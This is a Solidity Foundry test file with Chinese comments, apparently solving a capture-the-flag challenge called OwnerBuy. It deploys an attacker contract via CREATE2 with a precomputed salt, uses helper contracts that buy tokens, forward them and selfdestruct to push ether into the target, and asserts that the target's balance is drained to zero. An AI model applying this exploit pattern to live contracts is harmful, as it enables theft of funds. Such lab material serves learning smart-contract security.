// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "./bytecode.sol";

contract attackTest is Test{
    IOwnerBuy public ownerbuy;
    // 用remix获取attacker.sol的bytecode
    bytes bytecode = BYTECODE;
    bytes32 bytecodeHash = 0x3441600f3121d3cc8960a9230b29772dc5ad4318ec5a1768296869a7c6821001;

    function setUp() public{}

    function test_isComplete() public {
        // 用户0x5B38Da6a701c568545dCfcB03FcB875f56beddC4来进行攻击
        payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4).transfer(1 ether); // 给点钱，否则无法buy()
        vm.startPrank(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4);
        vm.label(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4), "user"); 

        // 部署攻击合约,注意要用solidity来计算！不要直接用网页上面的keccak256，因为要做一点abi格式化
        // 需要用到脚本来计算salt，就不放在GitHub了，博客中关于CREATE2的内容中有可以自行找一下
        IAttacker attackerAddress = IAttacker(payable(deploy(0x0000000000000000000000000000000000000000000000000000000000025884)));
        vm.label(address(attackerAddress), "attackerAddress");

        // 攻击之前初始化
        attackerAddress.init();
        ownerbuy = IOwnerBuy(address(attackerAddress.ownerbuy()));
        vm.label(address(ownerbuy), "ownerbuy");
        attackerAddress.beforeAttack{value:1 wei}();

        // 使用三个Helper来获得空投满足条件
        for(uint256 i = 0; i < 4; i++){
            Helper helper = new Helper(address(ownerbuy));
            helper.buyAndTransfer{value:10000 wei}(address(attackerAddress));
        }

        attackerAddress.Attack(); // 开始攻击
        assertEq(address(ownerbuy).balance, 0); // 检查是否攻击成功

        vm.stopPrank();
    }

    function deploy(bytes32 salt) public returns(address) {
        address addr;
        bytes memory _bytecode = bytecode;
        assembly {
            addr := create2(0, add(_bytecode, 0x20), mload(_bytecode), salt)
        }
        return addr;
    }

}

contract Helper{
    IOwnerBuy ownerbuy;
    
    constructor(address _addr) payable public{
        ownerbuy = IOwnerBuy(_addr);
    }
    function buyAndTransfer(address _addr) public payable {
        ownerbuy.buy{value: 1 wei}(); // 获得100元
        ownerbuy.transfer(_addr,100); // 转给攻击合约地址
        selfdestruct(payable(address(ownerbuy))); // sell()的时候ownerbuy需要钱才能调用
    }

}

interface IOwnerBuy{
    function buy() external payable returns (bool);
    function sell(uint256) external returns (bool );
    function finish() external  returns (bool);
    function changeOwner() external;
    function changestatus(address) external;
    function transferOwnership(address) external;
    function transfer(address, uint256) external returns (bool);
    function _owner() external returns(address);
    function balanceOf(address ) external view returns (uint256);
    
}

interface IAttacker{
    function ownerbuy() external view returns(address);
    function init() external;
    function beforeAttack() external payable;
    function Attack() external;
    function isOwner(address ) external returns(bool);
}